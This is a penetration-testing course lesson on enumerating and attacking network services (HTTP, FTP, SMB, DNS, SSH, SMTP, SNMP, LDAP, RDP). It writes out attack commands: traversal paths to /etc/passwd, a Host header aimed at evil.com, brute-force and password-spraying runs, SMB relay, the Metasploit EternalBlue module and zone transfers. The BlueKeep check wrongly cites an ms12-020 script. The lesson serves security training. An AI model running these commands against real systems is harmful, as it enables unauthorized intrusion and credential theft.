# Lesson 2.3: Protocol Analysis & Exploitation

## Objective
Understand common network protocols and learn to enumerate and exploit them during penetration testing.

---

## HTTP/HTTPS (Ports 80/443)

### HTTP Basics

**Request Structure:**
```
GET / HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html
Connection: keep-alive
```

**Response Structure:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.41
Content-Type: text/html
Content-Length: 1234

<html>...</html>
```

### HTTP Methods

```
GET     - Retrieve resource
POST    - Submit data
PUT     - Upload/update resource
DELETE  - Remove resource
HEAD    - Get headers only (no body)
OPTIONS - Allowed methods
TRACE   - Echo request (XSS vector!)
CONNECT - Establish tunnel (proxy)
```

### HTTP Status Codes

```
1xx - Informational
2xx - Success
  200 OK
  201 Created
  204 No Content

3xx - Redirection
  301 Moved Permanently
  302 Found (temporary redirect)
  304 Not Modified

4xx - Client Error
  400 Bad Request
  401 Unauthorized
  403 Forbidden
  404 Not Found
  405 Method Not Allowed

5xx - Server Error
  500 Internal Server Error
  502 Bad Gateway
  503 Service Unavailable
```

### HTTP Enumeration

```bash
# Banner grabbing
curl -I http://target.com
nc target.com 80
GET / HTTP/1.1
Host: target.com

# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Technology detection
whatweb http://target.com
wappalyzer (browser extension)

# Check HTTP methods
nmap --script http-methods target.com
curl -X OPTIONS http://target.com -v

# Nikto scan
nikto -h http://target.com
```

### Common HTTP Attacks

1. **Directory Traversal**
```
http://target.com/../../../../etc/passwd
http://target.com/....//....//....//etc/passwd
```

2. **HTTP Verb Tampering**
```bash
# If GET is forbidden, try POST
curl -X POST http://target.com/admin
```

3. **Host Header Injection**
```
GET / HTTP/1.1
Host: evil.com
```

---

## FTP (Ports 20/21)

### FTP Basics

```
Port 21 - Control (commands)
Port 20 - Data transfer (active mode)
```

**Active vs Passive:**
- **Active FTP:** Server connects back to client (firewall issues)
- **Passive FTP:** Client initiates both connections (modern default)

### FTP Enumeration

```bash
# Connect to FTP
ftp target.com

# Anonymous login
Username: anonymous
Password: anonymous@example.com

# Nmap FTP scripts
nmap --script ftp-anon,ftp-bounce,ftp-brute -p 21 target.com

# Check for anonymous access
nmap --script ftp-anon -p 21 target.com
```

### FTP Commands

```
USER <username>  - Specify username
PASS <password>  - Specify password
LIST             - List files
RETR <file>      - Download file
STOR <file>      - Upload file
CWD <directory>  - Change directory
PWD              - Print working directory
QUIT             - Disconnect
```

### FTP Exploitation

```bash
# Anonymous login attempt
ftp target.com
# Try: anonymous / anonymous

# Brute force
hydra -L users.txt -P passwords.txt ftp://target.com

# Check for writable directories
ftp> put test.txt
ftp> ls -la

# ProFTPD 1.3.5 (famous backdoor)
# Specific exploits for vulnerable versions
```

**Red Flags:**
- Anonymous login enabled
- Writable web root
- Outdated FTP server (vsftpd 2.3.4 backdoor)

---

## SMB (Port 445) / NetBIOS (Port 139)

### SMB Basics

**Server Message Block** - File/printer sharing on Windows networks.

```
Port 139 - NetBIOS (legacy)
Port 445 - SMB (modern)
```

### SMB Enumeration

```bash
# Enum4linux (comprehensive)
enum4linux -a target.com

# Nmap SMB scripts
nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 target.com

# List shares with smbclient
smbclient -L //target.com -N

# Connect to share
smbclient //target.com/sharename -U username

# Null session (anonymous)
smbclient -L //target.com -N
rpcclient -U "" target.com

# CrackMapExec
crackmapexec smb target.com -u '' -p ''
crackmapexec smb target.com -u users.txt -p passwords.txt

# SMBMap
smbmap -H target.com
smbmap -H target.com -u guest
```

### SMB Attacks

1. **EternalBlue (MS17-010)**
```bash
# Check vulnerability
nmap --script smb-vuln-ms17-010 -p 445 target.com

# Metasploit exploit
use exploit/windows/smb/ms17_010_eternalblue
```

2. **Null Sessions**
```bash
rpcclient -U "" -N target.com
smbclient -L //target.com -N
```

3. **SMB Relay Attack**
```bash
# Capture and relay SMB authentication
responder -I eth0
ntlmrelayx.py -t target.com
```

4. **Password Spraying**
```bash
crackmapexec smb target.com -u users.txt -p 'Password123'
```

**Red Flags:**
- SMBv1 enabled (vulnerable to EternalBlue)
- Null sessions allowed
- Guest access enabled
- Weak passwords
- Default shares exposed

---

## DNS (Port 53)

### DNS Record Types

```
A     - IPv4 address
AAAA  - IPv6 address
CNAME - Alias
MX    - Mail server
NS    - Name server
TXT   - Text (SPF, DKIM, verification)
SOA   - Start of Authority
PTR   - Reverse lookup
```

### DNS Enumeration

```bash
# Basic lookup
dig example.com
nslookup example.com
host example.com

# Specific record types
dig example.com A
dig example.com MX
dig example.com NS
dig example.com TXT
dig example.com ANY

# Reverse DNS
dig -x 8.8.8.8

# Zone transfer attempt (AXFR)
dig @ns1.example.com example.com AXFR
host -t axfr example.com ns1.example.com

# Subdomain enumeration
dnsrecon -d example.com
sublist3r -d example.com
amass enum -d example.com

# DNS brute force
dnsenum example.com
fierce -dns example.com

# Check specific DNS server
dig @8.8.8.8 example.com
```

### DNS Attacks

1. **Zone Transfer**
```bash
# If misconfigured, get entire DNS database
dig @ns1.target.com target.com AXFR
```

2. **DNS Cache Snooping**
```bash
# Check if domain is in cache (information disclosure)
dig @target.com example.com +norecurse
```

3. **Subdomain Takeover**
```bash
# Find dangling CNAMEs
dig target.com
# If CNAME points to unclaimed resource, take it over
```

**Red Flags:**
- Zone transfers allowed
- Recursive queries from internet
- Outdated BIND version
- Missing SPF/DMARC records

---

## SSH (Port 22)

### SSH Enumeration

```bash
# Banner grabbing
nc target.com 22
telnet target.com 22

# Nmap enumeration
nmap --script ssh-auth-methods,ssh-brute,ssh2-enum-algos -p 22 target.com

# Check supported algorithms
nmap --script ssh2-enum-algos -p 22 target.com
```

### SSH Attacks

```bash
# Brute force
hydra -l root -P passwords.txt ssh://target.com
medusa -h target.com -u root -P passwords.txt -M ssh

# User enumeration (some versions)
# CVE-2018-15473
python ssh_enum.py target.com

# Weak key exchange
# Look for deprecated ciphers/MACs
```

**Red Flags:**
- Root login allowed
- Password authentication enabled (vs key-only)
- Weak ciphers enabled
- Outdated OpenSSH version

---

## SMTP (Port 25, 587, 465)

### SMTP Enumeration

```bash
# Banner grabbing
nc target.com 25
telnet target.com 25

# User enumeration
smtp-user-enum -M VRFY -U users.txt -t target.com
nmap --script smtp-enum-users target.com

# Commands
HELO example.com
VRFY root
EXPN root
RCPT TO: user@target.com
```

### SMTP Commands

```
HELO/EHLO - Identify yourself
MAIL FROM  - Sender address
RCPT TO    - Recipient address
DATA       - Message content
VRFY       - Verify user exists
EXPN       - Expand mailing list
QUIT       - Close connection
```

**Red Flags:**
- VRFY/EXPN enabled (user enumeration)
- Open relay
- No SPF/DKIM/DMARC
- Outdated mail server

---

## SNMP (Port 161/162 UDP)

### SNMP Basics

**Simple Network Management Protocol** - Monitors/manages network devices.

```
Port 161 - SNMP requests
Port 162 - SNMP traps
```

**Community Strings:**
- **public** - Read-only (default)
- **private** - Read-write (default)

### SNMP Enumeration

```bash
# Check if SNMP is open
nmap -sU -p 161 target.com

# SNMP walk
snmpwalk -v2c -c public target.com
snmpwalk -v2c -c public target.com 1.3.6.1.2.1.1

# Brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com

# Enumerate users, processes, software
snmpcheck -t target.com -c public
```

**Information Disclosed:**
- System info
- Network interfaces
- Running processes
- Installed software
- User accounts
- Routing tables

**Red Flags:**
- Default community strings
- SNMPv1/v2 (no encryption)
- Write access available

---

## LDAP (Port 389/636)

### LDAP Enumeration

```bash
# Nmap scripts
nmap --script ldap-search,ldap-brute -p 389 target.com

# Anonymous bind
ldapsearch -x -h target.com -s base

# Enumerate naming contexts
ldapsearch -x -h target.com -s base namingContexts

# Dump all objects
ldapsearch -x -h target.com -b "dc=example,dc=com"
```

---

## RDP (Port 3389)

### RDP Enumeration

```bash
# Check if RDP is enabled
nmap -p 3389 target.com

# Nmap scripts
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 target.com

# Connect with rdesktop
rdesktop target.com

# Connect with xfreerdp
xfreerdp /v:target.com /u:username /p:password
```

### RDP Attacks

```bash
# BlueKeep (CVE-2019-0708)
nmap --script rdp-vuln-ms12-020 -p 3389 target.com

# Brute force
crowbar -b rdp -s target.com/32 -u admin -C passwords.txt
hydra -l administrator -P passwords.txt rdp://target.com
```

---

## Hands-On Exercises

### Exercise 1: HTTP Enumeration
```bash
# 1. Banner grab
curl -I http://target.com

# 2. Directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# 3. Check for common files
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml

# 4. Technology fingerprinting
whatweb http://target.com
```

### Exercise 2: SMB Enumeration
```bash
# 1. List shares
smbclient -L //target.com -N

# 2. Check for null session
rpcclient -U "" -N target.com

# 3. Enumerate with enum4linux
enum4linux -a target.com

# 4. Check for EternalBlue
nmap --script smb-vuln-ms17-010 -p 445 target.com
```

### Exercise 3: DNS Reconnaissance
```bash
# 1. Basic lookup
dig target.com

# 2. Get all records
dig target.com ANY

# 3. Attempt zone transfer
dig @ns1.target.com target.com AXFR

# 4. Subdomain enumeration
sublist3r -d target.com
```

---

## Key Takeaways

1. Each protocol has specific enumeration techniques
2. Default configurations are often insecure
3. Banner grabbing reveals version information
4. Many protocols allow anonymous enumeration
5. Outdated services often have known exploits
6. Understanding protocols helps identify attack vectors

---

## Next Lesson
**Lesson 2.4: Man-in-the-Middle Attacks** - Learn ARP spoofing, traffic interception, and MITM techniques.
